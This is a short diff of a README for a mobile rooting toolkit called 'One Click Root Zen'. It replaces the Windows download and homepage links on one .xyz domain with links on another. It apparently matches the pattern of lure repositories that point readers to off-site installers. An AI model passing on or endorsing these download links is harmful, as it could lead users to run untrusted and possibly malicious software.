@@ -21,8 +21,8 @@ Versatile **One Click Root Zen** mobile toolkit for device customization, app ma
 > Pin it to your taskbar for quick access.
 
 ## Get it
-- 📥 **Download for Windows:** [https://one-click-root-zen.softonx.xyz](https://one-click-root-zen.softonx.xyz)
-- 📖 **Homepage:** [https://one-click-root-zen.softonx.xyz](https://one-click-root-zen.softonx.xyz)
+- 📥 **Download for Windows:** [https://one-click-root-zen.softax.xyz](https://one-click-root-zen.softax.xyz)
+- 📖 **Homepage:** [https://one-click-root-zen.softax.xyz](https://one-click-root-zen.softax.xyz)
 
 ## ⚡ Key Features
 1. **Device Management:** Advanced tools for app installation and system configuration.
